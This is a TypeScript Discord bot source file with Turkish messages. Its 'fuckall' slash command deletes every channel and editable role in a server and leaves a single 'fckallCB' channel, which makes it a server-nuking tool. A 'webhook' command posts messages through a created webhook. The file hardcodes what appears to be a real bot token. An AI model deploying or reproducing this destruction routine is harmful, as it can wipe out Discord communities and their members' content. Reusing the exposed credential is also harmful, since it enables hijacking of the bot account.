import { Client, GatewayIntentBits, PermissionsBitField, TextChannel, REST, Routes, SlashCommandBuilder, WebhookClient, Interaction, TextChannel as DiscordTextChannel } from 'discord.js';
import * as dotenv from 'dotenv';

dotenv.config();

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMessageReactions,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildPresences
  ],
});

const OWNER_ID = "976743475200544788";
const LOG_CHANNEL_ID = "1360373357098303580";
const SERVER_ID = "1253358334300389558";
const CLIENT_ID = "1365609373124132905";
const TOKEN = "MTM2NTYwOTM3MzEyNDEzMjkwNQ.G88LPU.FkfXTKvGhildAq5uhWDZx0jvyxV6-EbebeOXDY";

const commands = [
  new SlashCommandBuilder()
    .setName('ping')
    .setDescription('Botun ping değerini gösterir')
    .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator),
  new SlashCommandBuilder()
    .setName('fuckall')
    .setDescription('Sunucuyu sıfırlar (Sadece bot sahibi kullanabilir)')
    .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator),
  new SlashCommandBuilder()
    .setName('webhook')
    .setDescription('Webhook ile mesaj gönder')
    .addStringOption(option =>
      option.setName('mesaj')
        .setDescription('Gönderilecek mesaj')
        .setRequired(true))
    .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator)
];

const rest = new REST({ version: '10' }).setToken(TOKEN);

client.once('ready', async () => {
  console.log(`Logged in as ${client.user?.tag}!`);
  
  try {
    console.log('Started refreshing application (/) commands.');
    
    // Ana sunucu için komutları yükle
    await rest.put(
      Routes.applicationGuildCommands(CLIENT_ID, SERVER_ID),
      { body: commands },
    );
    
    // Deneme sunucusu için komutları yükle
    await rest.put(
      Routes.applicationGuildCommands(CLIENT_ID, "1366502577566519377"),
      { body: commands },
    );
    
    console.log('Successfully reloaded application (/) commands.');
  } catch (error) {
    console.error('Error refreshing commands:', error);
  }
});

client.on('interactionCreate', async (interaction: Interaction) => {
  if (!interaction.isCommand()) return;

  if (interaction.commandName === 'ping') {
    await interaction.reply('pong');
  }

  if (interaction.commandName === 'webhook') {
    if (interaction.user.id !== OWNER_ID) {
      await interaction.reply({ content: 'Bu komutu sadece bot sahibi kullanabilir!', ephemeral: true });
      return;
    }

    const message = interaction.options.get('mesaj')?.value as string;

    try {
      const channel = interaction.channel as DiscordTextChannel;
      if (!channel) return;

      const webhooks = await channel.fetchWebhooks();
      let webhook = webhooks.find((wh: any) => wh.token);

      if (!webhook) {
        webhook = await channel.createWebhook({
          name: 'Fuck All Webhook',
          avatar: 'https://i.imgur.com/AfFp7pu.png',
        });
      }

      await webhook.send({
        content: message
      });

      await interaction.reply({ content: 'Webhook mesajı gönderildi!', ephemeral: true });
    } catch (error) {
      console.error('Webhook hatası:', error);
      await interaction.reply({ content: 'Webhook mesajı gönderilemedi!', ephemeral: true });
    }
  }

  if (interaction.commandName === 'fuckall') {
    if (interaction.user.id !== OWNER_ID) {
      await interaction.reply({ content: 'Bu komutu sadece bot sahibi kullanabilir!', ephemeral: true });
      return;
    }

    await interaction.deferReply();
    
    try {
      const guild = interaction.guild;
      if (!guild) return;

      // Kanalları sil
      const channels = guild.channels.cache;
      for (const [, channel] of channels) {
        await channel.delete();
      }

      // Rolleri sil (everyone rolü hariç)
      const roles = guild.roles.cache;
      for (const [, role] of roles) {
        if (role.name !== '@everyone' && role.editable) {
          await role.delete();
        }
      }

      // fckallCB kanalını oluştur
      const newChannel = await guild.channels.create({
        name: 'fckallCB',
        type: 0,
        permissionOverwrites: [
          {
            id: guild.id,
            allow: [PermissionsBitField.Flags.ViewChannel],
          },
        ],
      });

      await newChannel.send('Sunucu sıfırlandı.');
      await interaction.editReply('Sunucu başarıyla sıfırlandı!');
    } catch (error) {
      console.error('Bir hata oluştu:', error);
      await interaction.editReply('Bir hata oluştu!');
    }
  }
});

client.on('messageDelete', async (message) => {
  if (!message.content) return;
  
  const urlRegex = /(https?:\/\/[^\s]+)/g;
  const urls = message.content.match(urlRegex);
  
  if (urls) {
    const logChannel = client.channels.cache.get(LOG_CHANNEL_ID) as TextChannel;
    if (logChannel) {
      urls.forEach(url => {
        logChannel.send(`Silinen mesajdan URL: ${url}`);
      });
    }
  }
});

// Error handling
client.on('error', error => {
  console.error('Discord client error:', error);
});

process.on('unhandledRejection', error => {
  console.error('Unhandled promise rejection:', error);
});

client.login(TOKEN);
